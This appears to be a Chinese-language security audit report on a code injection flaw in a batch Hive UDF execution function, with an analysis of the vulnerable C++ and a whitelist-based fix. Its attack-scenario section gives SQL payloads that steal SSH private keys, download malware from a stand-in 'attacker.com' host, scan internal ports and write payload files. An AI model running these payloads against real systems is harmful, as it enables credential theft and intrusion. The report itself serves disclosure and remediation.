# VULN-DF-UDF-002：UDF批量执行代码注入漏洞

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-DF-UDF-002 (同时涉及 VULN-SEC-UDF-002) |
| **类型** | 代码注入 / 任意代码执行 |
| **CWE** | CWE-94 (Improper Control of Generation of Code) |
| **严重程度** | Critical |
| **置信度** | 85/100 |
| **影响模块** | udf, codegen |
| **文件位置** | `core/src/udf/cplusplus/java_udf_functions.cpp:166-177` |
| **函数名** | `ExecuteHiveUdfBatch` |

## 技术分析

### 漏洞代码

```cpp
void ExecuteHiveUdfBatch(int64_t contextPtr, const char *udfClass, int32_t *inputTypes, int32_t retType,
    int32_t vecCount, int32_t rowCount, int64_t *inputValues, int64_t *inputNulls, int64_t *inputLengths,
    int64_t outputValueAddr, int64_t outputNullAddr, int64_t outputLengthAddr)
{
    // 根据返回类型选择不同的执行路径
    if (TypeUtil::IsStringType(static_cast<type::DataTypeId>(retType))) {
        ExecHiveUdfOutputString(contextPtr, udfClass, inputTypes, retType, vecCount, rowCount, inputValues, 
            inputNulls, inputLengths, outputValueAddr, outputNullAddr, outputLengthAddr);
    } else {
        ExecHiveUdfOutputNonString(contextPtr, udfClass, inputTypes, retType, vecCount, rowCount, inputValues,
            inputNulls, inputLengths, outputValueAddr, outputNullAddr, outputLengthAddr);
    }
}

// ExecHiveUdfOutputString 内部（line 75-133）
static void ExecHiveUdfOutputString(int64_t contextPtr, const char *udfClass, ...) {
    auto env = JniUtil::GetJNIEnv();
    jstring jUdfClassName = env->NewStringUTF(udfClass);  // 无验证
    env->CallStaticVoidMethod(executorCls, executeBatchMethod, jUdfClassName, ...);  // 执行任意类
}

// ExecHiveUdfOutputNonString 内部（line 135-164）
static void ExecHiveUdfOutputNonString(int64_t contextPtr, const char *udfClass, ...) {
    auto env = JniUtil::GetJNIEnv();
    jstring jUdfClassName = env->NewStringUTF(udfClass);  // 无验证
    env->CallStaticVoidMethod(..., jUdfClassName, ...);  // 执行任意类
}
```

### 与 ExecuteHiveUdfSingle 的对比

| 特性 | ExecuteHiveUdfSingle | ExecuteHiveUdfBatch |
|------|---------------------|---------------------|
| 执行模式 | 单行逐条执行 | 批量处理多行 |
| JVM 调用方法 | `executeSingle` | `executeBatch` |
| 性能影响 | 较低（适合小数据量） | 较高（适合大数据量） |
| 攻击效率 | 单次执行一条命令 | 单次执行多条命令 |
| 数据处理 | 单行输入输出 | 数组输入输出 |

### 漏洞机制

1. **批量执行放大攻击**: 批量模式可以在一次调用中处理大量数据，攻击效率更高
2. **两个执行分支**: 根据返回类型选择不同的执行路径，但都存在相同的类名注入问题
3. **无差异化验证**: 批量和单行模式都没有对 `udfClass` 进行验证
4. **相同的安全缺陷**: 本质上与 `ExecuteHiveUdfSingle` 相同的代码注入漏洞

## 攻击场景演示

### 场景 1: 批量数据窃取

```sql
-- 利用批量执行高效读取大量文件
CREATE TEMPORARY FUNCTION batch_read AS 'java.io.FileInputStream';

-- 批量读取所有用户的配置文件
SELECT batch_read('/home/' || username || '/.ssh/id_rsa') 
FROM users 
WHERE username IN ('admin', 'root', 'operator');
-- 一次批量执行窃取多个 SSH 私钥
```

### 场景 2: 批量命令执行

```sql
-- 在批量处理中执行多条命令
CREATE TEMPORARY FUNCTION batch_cmd AS 'java.lang.Runtime';

SELECT batch_cmd('exec', 'wget attacker.com/malware' || id || '.sh') 
FROM large_table;
-- 执行大量下载命令
```

### 场景 3: 批量网络扫描

```sql
-- 批量探测内网端口
CREATE TEMPORARY FUNCTION scan_port AS 'java.net.Socket';

SELECT scan_port('10.0.0.' || subnet || '.' || host, port) 
FROM ip_ranges, port_list;
-- 批量扫描内网可达性
```

### 场景 4: 批量数据写入

```sql
-- 批量写入恶意数据到文件
CREATE TEMPORARY FUNCTION write_file AS 'java.io.FileOutputStream';

SELECT write_file('/tmp/payload_' || id || '.bin', malicious_data)
FROM attack_payloads;
-- 快速部署大量恶意文件
```

## 影响评估

### 批量模式的额外风险

| 影响 | 严重程度 | 说明 |
|------|---------|------|
| **攻击效率提升** | Critical | 批量处理可在短时间内执行大量攻击 |
| **资源消耗放大** | High | 每次批量调用消耗更多 JVM 资源 |
| **隐蔽性增强** | Medium | 批量查询更难被实时检测 |
| **数据窃取效率** | Critical | 可一次性窃取大量敏感数据 |

### CVSS 评分: 10.0 (Critical)

批量执行模式不改变漏洞的根本严重性，但增加了攻击效率和隐蔽性。

## 修复建议

### 与 ExecuteHiveUdfSingle 统一修复

由于两个函数存在相同的安全缺陷，建议使用统一的验证逻辑：

```cpp
// 共享验证函数
static bool ValidateUdfClass(const char *udfClass, int64_t contextPtr) {
    // 白名单验证
    static const std::set<std::string> allowedUdfClasses = {
        "com.example.udf.ValidUdf1",
        "com.example.udf.ValidUdf2",
    };
    
    if (!allowedUdfClasses.contains(udfClass)) {
        SetError(contextPtr, "UDF class not in whitelist: " + std::string(udfClass));
        return false;
    }
    
    // 包名前缀验证
    static const std::vector<std::string> allowedPrefixes = {
        "com.example.udf.",
        "org.apache.hadoop.hive.udf.",
    };
    
    bool prefixValid = false;
    for (const auto& prefix : allowedPrefixes) {
        if (strncmp(udfClass, prefix.c_str(), prefix.length()) == 0) {
            prefixValid = true;
            break;
        }
    }
    if (!prefixValid) {
        SetError(contextPtr, "UDF class prefix not allowed: " + std::string(udfClass));
        return false;
    }
    
    return true;
}

// 修改后的 ExecuteHiveUdfBatch
void ExecuteHiveUdfBatch(int64_t contextPtr, const char *udfClass, ...) {
    // 统一验证入口
    if (!ValidateUdfClass(udfClass, contextPtr)) {
        return;
    }
    
    // 原有逻辑
    if (TypeUtil::IsStringType(static_cast<type::DataTypeId>(retType))) {
        ExecHiveUdfOutputString(contextPtr, udfClass, ...);
    } else {
        ExecHiveUdfOutputNonString(contextPtr, udfClass, ...);
    }
}
```

### 内部函数也需验证

```cpp
static void ExecHiveUdfOutputString(int64_t contextPtr, const char *udfClass, ...) {
    // 再次验证（防止内部调用绕过）
    if (!ValidateUdfClass(udfClass, contextPtr)) {
        return;
    }
    
    // 原有逻辑
    auto env = JniUtil::GetJNIEnv();
    jstring jUdfClassName = env->NewStringUTF(udfClass);
    // ...
}

static void ExecHiveUdfOutputNonString(int64_t contextPtr, const char *udfClass, ...) {
    // 同样验证
    if (!ValidateUdfClass(udfClass, contextPtr)) {
        return;
    }
    
    // 原有逻辑
    // ...
}
```

## 相关漏洞

- **VULN-DF-UDF-001 / VULN-SEC-UDF-001**: `ExecuteHiveUdfSingle` 存在相同问题

建议创建统一的 `ValidateUdfClass` 函数，在所有 UDF 执行路径中强制调用。